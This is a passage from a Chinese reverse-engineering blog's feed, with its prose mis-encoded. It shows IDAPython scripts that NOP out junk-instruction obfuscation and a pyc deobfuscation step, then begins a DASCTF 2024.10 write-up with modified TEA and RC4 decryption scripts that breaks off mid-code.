class="hljs-number">0x90</span>);<br>              &#125;<br>              i=i+<span class="hljs-number">5</span>;<br>              <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span> ; j&lt;<span class="hljs-number">1</span>; j++,i++ )&#123;<br>                  PatchByte(i,<span class="hljs-number">0x90</span>);<br>              &#125;  <br>              i=i+<span class="hljs-number">3</span>;<br>              <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span> ; j&lt;<span class="hljs-number">2</span>; j++,i++ )&#123;<br>                  PatchByte(i,<span class="hljs-number">0x90</span>);<br>              &#125;    <br>              i--;    <br>          &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1708908062701-c3a60020-c29f-423a-8530-75efd5c88945-173184166708751.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ida_bytes <span class="hljs-keyword">import</span> get_bytes,patch_bytes<br>start= <span class="hljs-number">0x401000</span><br>end = <span class="hljs-number">0x422000</span><br>buf = get_bytes(start,end-start)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">patch_at</span>(<span class="hljs-params">p,ln</span>):<br>    <span class="hljs-keyword">global</span> buf<br>    buf = buf[:p]+<span class="hljs-string">b&quot;\x90&quot;</span>*ln+buf[p+ln:]<br><br>fake_jcc=[]<br><span class="hljs-keyword">for</span> opcode <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x70</span>,<span class="hljs-number">0x7f</span>,<span class="hljs-number">2</span>):<br>    pattern = <span class="hljs-built_in">chr</span>(opcode)+<span class="hljs-string">&quot;\x03&quot;</span>+<span class="hljs-built_in">chr</span>(opcode|<span class="hljs-number">1</span>)+<span class="hljs-string">&quot;\x01&quot;</span><br>    fake_jcc.append(pattern.encode())<br>    pattern = <span class="hljs-built_in">chr</span>(opcode|<span class="hljs-number">1</span>)+<span class="hljs-string">&quot;\x03&quot;</span>+<span class="hljs-built_in">chr</span>(opcode)+<span class="hljs-string">&quot;\x01&quot;</span><br>    fake_jcc.append(pattern.encode())<br><br><span class="hljs-built_in">print</span>(fake_jcc)<br><span class="hljs-keyword">for</span> pattern <span class="hljs-keyword">in</span> fake_jcc:<br>    p = buf.find(pattern)<br>    <span class="hljs-keyword">while</span> p != -<span class="hljs-number">1</span>:<br>        patch_at(p,<span class="hljs-number">5</span>)<br>        p = buf.find(pattern,p+<span class="hljs-number">1</span>)<br><br>patch_bytes(start,buf)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done&quot;</span>) <br></code></pre></td></tr></table></figure><p>å»å¸¸è§èŠ±æŒ‡ä»¤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> idc<br><span class="hljs-keyword">import</span> ida_bytes<br><span class="hljs-keyword">import</span> keystone<br><span class="hljs-keyword">import</span> capstone<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_x86</span>():<br>    <span class="hljs-keyword">global</span> ks, cs<br>    ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_32)<br>    cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_32)<br><br>set_x86()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">asm</span>(<span class="hljs-params">code, addr=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(ks.asm(code, addr)[<span class="hljs-number">0</span>])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">disasm</span>(<span class="hljs-params">code, addr=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cs.disasm(code, addr):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&#x27;%s %s&#x27;</span> %(i.mnemonic, i.op_str))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">MakeCode</span>(<span class="hljs-params">ea</span>):<br>    <span class="hljs-keyword">return</span> idc.create_insn(ea)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">disasm_at</span>(<span class="hljs-params">addr</span>):<br>    size = MakeCode(addr)<br>    code = idc.get_bytes(addr, size)<br>    <span class="hljs-keyword">return</span> addr + size, disasm(code, addr)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">disasm_block</span>(<span class="hljs-params">start, end</span>):<br>    codes = []<br>    addr = start<br>    <span class="hljs-keyword">while</span> addr &lt; end:<br>        _addr, code = disasm_at(addr)<br>        codes.append((addr, code))<br>        addr = _addr<br>    <span class="hljs-keyword">return</span> codes<br><br><br>addr = <span class="hljs-number">0x4010b0</span><br>end = <span class="hljs-number">0x402e41</span><br><span class="hljs-keyword">while</span> addr &lt; end:<br>    ida_bytes.del_items(addr, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>)<br>    size = MakeCode(addr)<br>    <span class="hljs-keyword">assert</span> size, <span class="hljs-built_in">hex</span>(addr)<br>    <span class="hljs-keyword">if</span> size == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">if</span> ida_bytes.get_bytes(addr, <span class="hljs-number">3</span>) == <span class="hljs-string">b&#x27;\xf9\x72\x01&#x27;</span>: <span class="hljs-comment"># stc; jb $+3</span><br>            ida_bytes.patch_bytes(addr, <span class="hljs-string">b&#x27;\x90&#x27;</span> * <span class="hljs-number">4</span>)<br>        <span class="hljs-keyword">elif</span> ida_bytes.get_bytes(addr, <span class="hljs-number">3</span>) == <span class="hljs-string">b&#x27;\xf8\x73\x01&#x27;</span>: <span class="hljs-comment"># clc; jnb $+3</span><br>            ida_bytes.patch_bytes(addr, <span class="hljs-string">b&#x27;\x90&#x27;</span> * <span class="hljs-number">4</span>)<br>        <span class="hljs-keyword">else</span>:<br>            addr += size<br>    <span class="hljs-keyword">elif</span> size == <span class="hljs-number">2</span> <span class="hljs-keyword">and</span> ida_bytes.get_bytes(addr, <span class="hljs-number">2</span>) == <span class="hljs-string">b&#x27;\xeb\x01&#x27;</span>: <span class="hljs-comment"># jmp $+3</span><br>        ida_bytes.patch_bytes(addr, <span class="hljs-string">b&#x27;\x90&#x27;</span> * <span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">elif</span> size == <span class="hljs-number">5</span>:<br>        <span class="hljs-keyword">if</span> ida_bytes.get_bytes(addr, <span class="hljs-number">10</span>) == <span class="hljs-string">b&#x27;\xe8\x00\x00\x00\x00\x83\x04\x24\x06\xc3&#x27;</span>: <span class="hljs-comment"># call $+5; add dword ptr [esp], 6; ret</span><br>            ida_bytes.patch_bytes(addr, <span class="hljs-string">b&#x27;\x90&#x27;</span> * <span class="hljs-number">11</span>)<br>        <span class="hljs-keyword">else</span>:<br>            addr += size<br>    <span class="hljs-keyword">else</span>:<br>        addr += size<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Done.&#x27;</span>)<br></code></pre></td></tr></table></figure><ol><li>å®šä¹‰äº†ä¸€ä¸ªåä¸ºfçš„å‡½æ•°ï¼Œç”¨äºæ‰§è¡ŒäºŒè¿›åˆ¶æœç´¢å¹¶å¯¹åŒ¹é…çš„ä½ç½®è¿›è¡Œnop</li></ol><ul><li><ul><li>begin_addræ˜¯æœç´¢å¼€å§‹çš„åœ°å€ã€‚</li><li>end_addræ˜¯æœç´¢ç»“æŸçš„åœ°å€ã€‚</li><li>hexStræ˜¯ç”¨äºæœç´¢çš„åå…­è¿›åˆ¶æ¨¡å¼å­—ç¬¦ä¸²ï¼ˆç”¨ç©ºæ ¼åˆ†å¼€ï¼Œå…¶ä¸­??è¡¨ç¤ºé€šé…ç¬¦ï¼Œæ³¨æ„ä¸å¯ä»¥ä½¿ç”¨è¯¸å¦‚2?è¿™æ ·çš„æƒ…å†µï¼‰</li></ul></li></ul><ol><li>æ¥ç€ï¼Œå°†hexStrè½¬æ¢ä¸ºä¸¤ä¸ªå­—èŠ‚æ•°ç»„ï¼šbMaskå’ŒbPatternã€‚bMaskæ˜¯ç”¨äºè¡¨ç¤ºå¯å˜å­—èŠ‚çš„ï¼Œå…¶ä¸­00è¡¨ç¤ºéœ€è¦åŒ¹é…çš„å­—èŠ‚ï¼Œ01è¡¨ç¤ºä¸éœ€è¦åŒ¹é…çš„å­—èŠ‚ï¼›bPatternåˆ™æ˜¯ç”¨äºæœç´¢çš„å›ºå®šå­—èŠ‚åºåˆ—</li><li>å®šä¹‰äº†ä¸€ä¸ªsignså˜é‡ï¼Œç”¨äºæŒ‡å®šæœç´¢çš„æ ‡å¿—ä½ï¼Œå…¶ä¸­BIN_SEARCH_FORWARDè¡¨ç¤ºå‘å‰æœç´¢ï¼ŒBIN_SEARCH_NOBREAKè¡¨ç¤ºä¸å…è®¸æœç´¢ä¸­é€”ä¸­æ–­ï¼ŒBIN_SEARCH_NOSHOWè¡¨ç¤ºä¸æ˜¾ç¤ºæœç´¢ç»“æœ</li><li>æ¥ç€ä½¿ç”¨ida_bytes.bin_searchå‡½æ•°è¿›è¡ŒäºŒè¿›åˆ¶æœç´¢ï¼Œä»begin_addråˆ°end_addrä¹‹é—´æœç´¢bPatternï¼Œå…¶ä¸­å¯å˜å­—èŠ‚ç”±bMaskæŒ‡å®šã€‚æœç´¢åˆ°åŒ¹é…çš„ä½ç½®åï¼Œå°†å…¶æ‰“å°å‡ºæ¥ï¼Œå¹¶è°ƒç”¨patchå‡½æ•°å¯¹å…¶è¿›è¡Œè¡¥ä¸æ“ä½œ</li><li>æœ€åæ›´æ–°begin_addrä¸ºä¸‹ä¸€ä¸ªæœç´¢çš„èµ·å§‹åœ°å€ï¼Œé€šå¸¸ä¸ºå½“å‰åŒ¹é…ä½ç½®åŠ ä¸Šä¸€ä¸ªåç§»é‡</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ida_bytes<br><span class="hljs-keyword">import</span> ida_ida<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">patch</span>(<span class="hljs-params">ea,num=<span class="hljs-number">1</span></span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num):<br>        ida_bytes.patch_byte(ea+i,<span class="hljs-number">0x90</span>)<br>    <span class="hljs-keyword">return</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">begin_addr,end_addr,hexStr</span>)<br>  xx=(<span class="hljs-built_in">len</span>(hexStr)-<span class="hljs-number">1</span>)//<span class="hljs-number">2</span><br>    bMask = <span class="hljs-built_in">bytes</span>.fromhex(hexStr.replace(<span class="hljs-string">&#x27;00&#x27;</span>, <span class="hljs-string">&#x27;01&#x27;</span>).replace(<span class="hljs-string">&#x27;??&#x27;</span>, <span class="hljs-string">&#x27;00&#x27;</span>))<br>    bPattern = <span class="hljs-built_in">bytes</span>.fromhex(hexStr.replace(<span class="hljs-string">&#x27;??&#x27;</span>, <span class="hljs-string">&#x27;00&#x27;</span>))<br>    signs=ida_bytes.BIN_SEARCH_FORWARD| ida_bytes.BIN_SEARCH_NOBREAK| ida_bytes.BIN_SEARCH_NOSHOW<br>    <span class="hljs-keyword">while</span> begin_addr&lt;end_addr:<br>        ea=ida_bytes.bin_search(begin_addr,end_addr,bPattern,bMask,<span class="hljs-number">1</span>,signs)<br>        <span class="hljs-keyword">if</span> ea == ida_idaapi.BADADDR:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>: <br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ea))<br>            patch(ea,xx)<br>            begin_addr=ea+xx <br>f(<span class="hljs-number">0x0</span>,<span class="hljs-number">0x1000</span>,<span class="hljs-string">&quot;?? ?? 00 00 00 ??&quot;</span>)<br></code></pre></td></tr></table></figure><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1721562043136-2bd5e634-32dd-4a02-a83a-f8e6e7115c7e-173184166708853.png" class="" title="img"><p>åˆ†æmain()å‡½æ•°å¯ä»¥çœ‹åˆ°æ˜¯æ‚ä¹±çš„å­—èŠ‚ï¼Œè§‚å¯Ÿ0x1144å¯ä»¥å‘ç°ï¼Œå­˜åœ¨ç€jmp db1è¿™ç§ç±»å‹çš„èŠ±æŒ‡ä»¤ï¼Œå› æ­¤å¯ä»¥å†™ä¸€ä¸ªidapythonè„šæœ¬æ¥è§£å†³</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ida_bytes<br><span class="hljs-keyword">import</span> ida_ida<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">patch</span>(<span class="hljs-params">ea,num=<span class="hljs-number">1</span></span>):<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num):<br>    ida_bytes.patch_byte(ea+i,<span class="hljs-number">0x90</span>)<br>  <span class="hljs-keyword">return</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-----&quot;</span>)<br>hexStr=<span class="hljs-string">&quot;EB FF C0 BF ?? 00 00 00 E8&quot;</span><br>bMask = <span class="hljs-built_in">bytes</span>.fromhex(hexStr.replace(<span class="hljs-string">&#x27;00&#x27;</span>, <span class="hljs-string">&#x27;01&#x27;</span>).replace(<span class="hljs-string">&#x27;??&#x27;</span>, <span class="hljs-string">&#x27;00&#x27;</span>))<br>bPattern = <span class="hljs-built_in">bytes</span>.fromhex(hexStr.replace(<span class="hljs-string">&#x27;??&#x27;</span>, <span class="hljs-string">&#x27;00&#x27;</span>))<br>signs=ida_bytes.BIN_SEARCH_FORWARD| ida_bytes.BIN_SEARCH_NOBREAK| ida_bytes.BIN_SEARCH_NOSHOW<br><span class="hljs-built_in">print</span>(bMask,bPattern)<br>begin_addr=<span class="hljs-number">0x1135</span><br>end_addr=<span class="hljs-number">0x3100</span><br><span class="hljs-keyword">while</span> begin_addr&lt;end_addr:<br>  ea=ida_bytes.bin_search(begin_addr,end_addr,bPattern,bMask,<span class="hljs-number">1</span>,signs)<br>  <span class="hljs-keyword">if</span> ea == ida_idaapi.BADADDR:<br>    <span class="hljs-keyword">break</span><br>  <span class="hljs-keyword">else</span>: <br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ea))<br>    patch(ea,<span class="hljs-number">3</span>)<br>    begin_addr=ea+<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><h3 id="pycå»èŠ±æŒ‡ä»¤"><a href="#pycå»èŠ±æŒ‡ä»¤" class="headerlink" title="pycå»èŠ±æŒ‡ä»¤"></a>pycå»èŠ±æŒ‡ä»¤</h3><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit">è„šæœ¬è¯»å–æœºå™¨ç <span class="hljs-string">+010</span>åˆ æ‰èŠ±æŒ‡ä»¤+ä¿®æ”¹co_codeé•¿åº¦<br></code></pre></td></tr></table></figure><p>èŠ±æŒ‡ä»¤é€šå¸¸å¼€å¤´æ˜¯JUMP_ABSOLUTE Xï¼Œç„¶åå¡«å……é”™è¯¯ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> marshal, dis<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;D:\\new\\AD\\game\\vnctf2022\\re\\BabyMaze.pyc&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()<br>code = marshal.loads(f[<span class="hljs-number">16</span>:]) <span class="hljs-comment">#è¿™è¾¹ä»16ä½å¼€å§‹å–å› ä¸ºæ˜¯python3 python2ä»8ä½å¼€å§‹å–</span><br>dis.dis(code)<br>dis.dis(code)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(code.co_code))<br></code></pre></td></tr></table></figure><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1700738761596-0e59581e-b49e-4165-82c2-582914cabe90-173184166708855.png" class="" title="img"><p>è½¬ä¸ºåå…­è¿›åˆ¶åå»010editorä¿®æ”¹ï¼Œå»æ‰å³å¯ï¼Œè¿™é‡ŒJUMP_ABSOLUTE16è¿›åˆ¶ä¸º71</p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1700738995690-98510c80-1424-448e-b824-e2a26248c12f-173184166708857.png" class="" title="img"><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1700739054715-46fb1e74-1aa1-4380-a6d4-75db5236e992-173184166708859.png" class="" title="img"><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1700739191513-de253465-6cc9-4a7a-b634-9d64e2a4f19a-173184166708861.png" class="" title="img"><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1700739265623-36862cfa-dd7f-487e-8619-d168e782330b-173184166708863.png" class="" title="img"><p>ä¹‹åé‡æ–°åç¼–è¯‘å³å¯</p>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF2024.10éƒ¨åˆ†Reverse</title>
    <link href="/2024/10/19/DASCTF2024.10%E9%83%A8%E5%88%86Reverse/"/>
    <url>/2024/10/19/DASCTF2024.10%E9%83%A8%E5%88%86Reverse/</url>
    
    <content type="html"><![CDATA[<h1 id="ezre"><a href="#ezre" class="headerlink" title="ezre"></a><strong>ezre</strong></h1><p>14è§£</p><p>çœ‹ä¸Šå»æœ‰å£³ï¼Œä½†æ˜¯æ— æ³•æ‰‹åŠ¨è„±</p><img src="/2024/10/19/DASCTF2024.10%E9%83%A8%E5%88%86Reverse/1729308978432-b0dd664d-b08b-44d4-9f5a-c66b0e1fc67c.png" class="" title="img"><p>ä¸èƒ½sfxè„±å£³ï¼Œä¹Ÿä¸èƒ½åŠ¨è°ƒ</p><img src="/2024/10/19/DASCTF2024.10%E9%83%A8%E5%88%86Reverse/1729308926396-23de3e88-a3b4-4e4f-be89-cee838b32710.png" class="" title="img"><p>æœä¿æŠ¤å™¨çš„åå­—ï¼Œæ‰¾åˆ°unpackå·¥å…·<a href="https://github.com/ergrelet/unlicense">Releases Â· ergrelet&#x2F;unlicense (github.com)</a></p><p>å»èŠ±æŒ‡ä»¤åå¾—åˆ°mainæ˜¯rc4é­”æ”¹+teaé­”æ”¹</p><img src="/2024/10/19/DASCTF2024.10%E9%83%A8%E5%88%86Reverse/1729340053117-1a162c50-efe7-49c5-a0c8-b975e206541a.png" class="" title="img"><p>teaä¸€æ¬¡ç§»ä¸€ä¸ªå­—ç¬¦ï¼Œ36æ¬¡å¾ªç¯åˆšå¥½ç§»å®Œå…¨éƒ¨å¯†æ–‡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>], <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], delta = <span class="hljs-number">0x9E3779B8</span>, sum = <span class="hljs-number">0x66778899</span>+delta * (<span class="hljs-number">33</span>);<br>    <span class="hljs-comment">//printf(&quot;%x,%x,&quot;,v0,v1);</span><br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">32</span>; i++) &#123;<br>        v1 -= (((v0 &lt;&lt; <span class="hljs-number">4</span>) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>        sum -= delta;<br>        v0 -= (((v1 &lt;&lt; <span class="hljs-number">5</span>) ^ (v1 &gt;&gt; <span class="hljs-number">6</span>)) + v1) ^ (sum + key[sum &amp; <span class="hljs-number">3</span>]);<br><br>    &#125;<br>    v[<span class="hljs-number">0</span>] = v0; v[<span class="hljs-number">1</span>] = v1;<br>    <span class="hljs-comment">//printf(&quot;%x,%x,&quot;,v0,v1);</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0x6E982837</span>,<span class="hljs-number">0x44332211</span>,<span class="hljs-number">0x11223344</span>,<span class="hljs-number">0x3728986E</span>&#125;;<br>    <span class="hljs-type">char</span> enc[] = &#123;<span class="hljs-number">0x50</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x81</span>,<br>                  <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x5D</span>,<br>                  <span class="hljs-number">0x2E</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x80</span>,<br>                  <span class="hljs-number">0x81</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xE2</span>,<br>                  <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xD8</span>&#125;;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">36</span>; i&gt;=<span class="hljs-number">0</span>; i-=<span class="hljs-number">1</span>)&#123;<br>        decrypt(&amp;enc[i], k);<br><br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">44</span>; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%x,&quot;</span>, enc[i]&amp;<span class="hljs-number">0xff</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>rc4çš„é­”æ”¹</p><img src="/2024/10/19/DASCTF2024.10%E9%83%A8%E5%88%86Reverse/1729340154073-a6075c82-2bb0-44bd-85d5-9fa7896da708.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">data, key</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        out.append((char - (S[(S[i] + S[j]) % <span class="hljs-number">256</span>]^<span class="hljs-number">0x33</span>))%<span class="hljs-number">256</span>)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(out)<br><br>data = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0xf5</span>,<span class="hljs-number">0xcf</span>,<span class="hljs-number">0xc9</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0xba</span>,<span class="hljs-number">0x79</span>,<span class="hljs-number">0xd6</span>,<span class="hljs-number">0xe3</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">0xd5</span>,<span class="hljs-number">0x2c</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0xe9</span>,<span class="hljs-number">0xf6</span>,<span class="hljs-number">0x99</span>,<span class="hljs-number">0x71</span>,<span 